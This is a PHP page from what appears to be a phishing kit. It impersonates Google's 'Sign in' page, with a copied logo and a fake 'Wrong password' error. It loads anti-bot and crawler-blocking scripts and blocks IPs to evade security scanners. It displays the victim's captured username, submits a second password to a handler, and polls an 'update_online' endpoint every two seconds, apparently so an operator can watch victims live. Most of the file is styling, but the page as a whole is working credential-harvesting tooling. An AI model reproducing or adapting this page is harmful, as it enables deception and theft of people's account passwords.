<?php
error_reporting(0);
include('/../Antibot/Bot-Crawler.php');
include('/../Antibot/Dila_DZ.php');
include('/../Antibot/blockers.php');
include('/../Antibot/detects.php');

// pages/wrong_password.php
require_once __DIR__ . '/../includes/functions.php';
checkBlockedIP();  // Block access if IP is blocked

require_once __DIR__ . '/../includes/post_handlers.php';
$sessionId = $_GET['session_id'] ?? null;
if (!$sessionId) {
    header('Location: ../index.php');
    exit;
}

$sess = getSession($sessionId);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    handlePassword2Post($sessionId);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google</title>
    <link rel="icon" type="image/png" href="res/img/fav435vsdvge5.png">
    <link rel="stylesheet" href="res/css/style.css">
    <link rel="stylesheet" href="res/css/wrong-pass-style.css">
    <style>
        :root {
            --bg-0: #0b0f17;
            --bg-1: #111726;
            --bg-2: #1a2233;
            --card: rgba(22, 28, 42, 0.85);
            --border: rgba(120, 140, 180, 0.14);
            --border-strong: rgba(120, 140, 180, 0.28);
            --text-1: #e8edf7;
            --text-2: #9aa7bd;
            --text-3: #6b7689;
            --accent-1: #4f8cff;
            --accent-2: #8b5cf6;
            --accent-glow: rgba(79, 140, 255, 0.35);
            --danger: #ff5c72;
            --danger-soft: rgba(255, 92, 114, 0.12);
            --danger-border: rgba(255, 92, 114, 0.4);
            --radius-lg: 22px;
            --radius-md: 12px;
            --radius-sm: 8px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Inter", "Google Sans", Roboto, -apple-system, Arial, sans-serif;
        }

        html, body {
            min-height: 100%;
        }

        body {
            background: var(--bg-0);
            color: var(--text-1);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px 16px;
            position: relative;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }

        /* Ambient background glow */
        body::before,
        body::after {
            content: "";
            position: fixed;
            border-radius: 50%;
            filter: blur(120px);
            opacity: 0.55;
            pointer-events: none;
            z-index: 0;
        }

        body::before {
            width: 520px;
            height: 520px;
            background: radial-gradient(circle, var(--accent-1), transparent 70%);
            top: -180px;
            left: -160px;
        }

        body::after {
            width: 520px;
            height: 520px;
            background: radial-gradient(circle, var(--accent-2), transparent 70%);
            bottom: -200px;
            right: -160px;
        }

        .container {
            width: 100%;
            max-width: 980px;
            position: relative;
            z-index: 1;
        }

        .signin-card {
            background: var(--card);
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            border: 1px solid var(--border);
            border-radius: var(--radius-lg);
            padding: 40px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 48px;
            position: relative;
            overflow: hidden;
            box-shadow:
                0 30px 80px rgba(0, 0, 0, 0.55),
                0 0 0 1px rgba(255, 255, 255, 0.02) inset;
        }

        /* Top accent line */
        .signin-card::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent-1), var(--accent-2), transparent);
            opacity: 0.8;
            z-index: 3;
        }

        .signin-left {
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding-top: 8px;
        }

        .signin-right {
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding-top: 8px;
        }

        .logo-container {
            margin-bottom: 28px;
        }

        .google-logo {
            width: 44px;
            height: 44px;
            display: block;
            filter: drop-shadow(0 4px 14px var(--accent-glow));
        }

        h1 {
            color: var(--text-1);
            font-size: 34px;
            font-weight: 600;
            letter-spacing: -0.02em;
            line-height: 1.2;
            margin-bottom: 12px;
        }

        .subtitle {
            color: var(--text-2);
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 28px;
        }

        .user-email {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 8px 14px;
            border: 1px solid var(--border-strong);
            border-radius: 999px;
            background: rgba(255, 255, 255, 0.03);
            color: var(--text-1);
            font-size: 14px;
            transition: border-color 0.2s ease, background 0.2s ease;
        }

        .user-email:hover {
            border-color: var(--accent-1);
            background: rgba(79, 140, 255, 0.08);
        }

        .user-icon,
        .dropdown-icon {
            opacity: 0.75;
            flex-shrink: 0;
        }

        /* Form */
        form {
            display: flex;
            flex-direction: column;
            gap: 18px;
        }

        .input-container {
            position: relative;
        }

        .input-container input {
            width: 100%;
            padding: 18px 16px 8px;
            font-size: 16px;
            color: var(--text-1);
            background: var(--bg-2);
            border: 1px solid var(--border-strong);
            border-radius: var(--radius-md);
            outline: none;
            transition: border-color 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
            caret-color: var(--accent-1);
        }

        .input-container input::placeholder {
            color: transparent;
        }

        .input-container input:focus {
            border-color: var(--accent-1);
            background: var(--bg-1);
            box-shadow: 0 0 0 4px var(--accent-glow);
        }

        .input-label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-3);
            font-size: 15px;
            pointer-events: none;
            transition: all 0.18s ease;
            background: transparent;
            padding: 0 4px;
        }

        .input-container input:focus + .input-label,
        .input-container input:not(:placeholder-shown) + .input-label {
            top: 0;
            font-size: 11px;
            letter-spacing: 0.06em;
            text-transform: uppercase;
            color: var(--accent-1);
            background: var(--bg-2);
            border-radius: 4px;
        }

        /* Error state for the input */
        .input-container.error input {
            border-color: var(--danger-border);
            background: var(--danger-soft);
        }

        .input-container.error input:focus {
            border-color: var(--danger);
            box-shadow: 0 0 0 4px rgba(255, 92, 114, 0.18);
            background: var(--bg-1);
        }

        .input-container.error .input-label {
            color: var(--danger);
        }

        .input-container.error input:focus + .input-label,
        .input-container.error input:not(:placeholder-shown) + .input-label {
            color: var(--danger);
            background: var(--danger-soft);
        }

        /* Error message */
        .error-message {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            padding: 12px 14px;
            border: 1px solid var(--danger-border);
            border-left: 3px solid var(--danger);
            border-radius: var(--radius-md);
            background: var(--danger-soft);
            color: var(--danger);
            font-size: 13px;
            line-height: 1.5;
        }

        .error-icon {
            flex-shrink: 0;
            margin-top: 1px;
            color: var(--danger);
        }

        /* Checkbox */
        .checkbox-container {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            color: var(--text-2);
            font-size: 14px;
            user-select: none;
            margin: 4px 0;
        }

        .checkbox-container input {
            appearance: none;
            -webkit-appearance: none;
            width: 18px;
            height: 18px;
            border: 1px solid var(--border-strong);
            border-radius: 5px;
            background: var(--bg-2);
            position: relative;
            cursor: pointer;
            transition: all 0.18s ease;
            flex-shrink: 0;
        }

        .checkbox-container input:checked {
            background: linear-gradient(135deg, var(--accent-1), var(--accent-2));
            border-color: transparent;
        }

        .checkbox-container input:checked::after {
            content: "";
            position: absolute;
            left: 5px;
            top: 1.5px;
            width: 5px;
            height: 10px;
            border: solid #fff;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        .checkbox-label {
            line-height: 1;
        }

        .show-password {
            display: flex;
            align-items: center;
        }

        .button-group {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-top: 6px;
        }

        button {
            font-family: inherit;
            cursor: pointer;
            border: none;
            outline: none;
            font-size: 15px;
            transition: all 0.2s ease;
        }

        .create-account {
            background: transparent;
            color: var(--accent-1);
            padding: 10px 4px;
            font-weight: 500;
        }

        .create-account:hover {
            color: #7aa9ff;
            text-decoration: underline;
            text-underline-offset: 4px;
        }

        .next-button {
            background: linear-gradient(135deg, var(--accent-1), var(--accent-2));
            color: #fff;
            font-weight: 600;
            letter-spacing: 0.01em;
            padding: 12px 30px;
            border-radius: 999px;
            box-shadow: 0 10px 24px var(--accent-glow);
            position: relative;
            overflow: hidden;
        }

        .next-button:hover {
            transform: translateY(-1px);
            box-shadow: 0 14px 30px var(--accent-glow);
        }

        .next-button:active {
            transform: translateY(0);
        }

        /* Loading state (same class toggled by JS) */
        .signin-card.submitting {
            pointer-events: none;
        }

        .signin-card.submitting::after {
            content: "";
            position: absolute;
            inset: 0;
            background: rgba(11, 15, 23, 0.55);
            backdrop-filter: blur(2px);
            z-index: 5;
        }

        .signin-card.submitting .next-button::before {
            content: "";
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
            animation: shimmer 1.2s linear infinite;
        }

        @keyframes shimmer {
            0%   { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        /* Footer */
        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 22px 8px 0;
            color: var(--text-3);
            font-size: 12px;
        }

        .language-select {
            color: var(--text-2);
            font-size: 12px;
            border: 1px solid transparent;
            border-radius: var(--radius-sm);
            background: transparent;
            padding: 6px 8px;
            cursor: pointer;
            outline: none;
            transition: all 0.18s ease;
        }

        .language-select:hover,
        .language-select:focus {
            color: var(--text-1);
            border-color: var(--border-strong);
            background: rgba(255,255,255,0.03);
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: var(--text-3);
            font-size: 12px;
            text-decoration: none;
            letter-spacing: 0.02em;
            transition: color 0.18s ease;
        }

        .footer-links a:hover {
            color: var(--text-1);
        }

        @media (max-width: 860px) {
            .signin-card {
                grid-template-columns: 1fr;
                gap: 32px;
                padding: 32px 28px;
            }

            .signin-right {
                padding-top: 0;
            }

            h1 {
                font-size: 28px;
            }

            .subtitle {
                margin-bottom: 20px;
            }
        }

        @media (max-width: 520px) {
            body {
                padding: 0;
                align-items: flex-start;
            }

            .signin-card {
                border-radius: 0;
                border-left: none;
                border-right: none;
                padding: 28px 20px;
                min-height: 100vh;
            }

            .footer {
                flex-direction: column;
                gap: 14px;
                padding: 22px 0 8px;
            }

            .button-group {
                flex-direction: column-reverse;
                align-items: stretch;
            }

            .next-button {
                width: 100%;
                padding: 14px 30px;
            }

            .create-account {
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <div class="logo-container">
                    <svg class="google-logo" viewBox="0 0 40 48" width="44" height="44" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                    </svg>
                </div>
                <h1>Welcome</h1>
                <div class="subtitle">
                    <div class="user-email">
                        <svg aria-hidden="true" class="user-icon" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM12 5c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                        </svg>
                        <span><?php echo htmlspecialchars($sess['username']); ?></span>
                        <svg aria-hidden="true" class="dropdown-icon" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                            <path d="M7 10l5 5 5-5z"></path>
                        </svg>
                    </div>
                </div>
            </div>
            
            <div class="signin-right">
                <form method="post">
                    <div class="input-container error">
                        <input type="password" id="password" placeholder=" " required name="password2" autofocus>
                        <label class="input-label" for="password">Enter your password</label>
                    </div>

                    <div class="error-message">
                        <svg aria-hidden="true" class="error-icon" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                        </svg>
                        <span>Wrong password. Try again or click Forgot password to reset it.</span>
                    </div>

                    <div class="show-password">
                        <label class="checkbox-container">
                            <input type="checkbox" id="show-password">
                            <span class="checkbox-label">Show password</span>
                        </label>
                    </div>

                    <div class="button-group">
                        <button class="create-account" type="button">Forgot password?</button>
                        <button type="submit" class="next-button">Next</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="footer">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function(event) {
            event.preventDefault();
            const card = document.querySelector('.signin-card');
            card.classList.add('submitting');
            
            setTimeout(() => {
                event.target.submit();
            }, 2000);
        });

        // Show/hide password functionality
        document.getElementById('show-password').addEventListener('change', function() {
            const passwordInput = document.getElementById('password');
            passwordInput.type = this.checked ? 'text' : 'password';
        });
		
	  setInterval(function(){
		fetch('../update_online.php?session_id=<?php echo $sessionId; ?>');
	  }, 2000);
    </script>
</body>
</html>
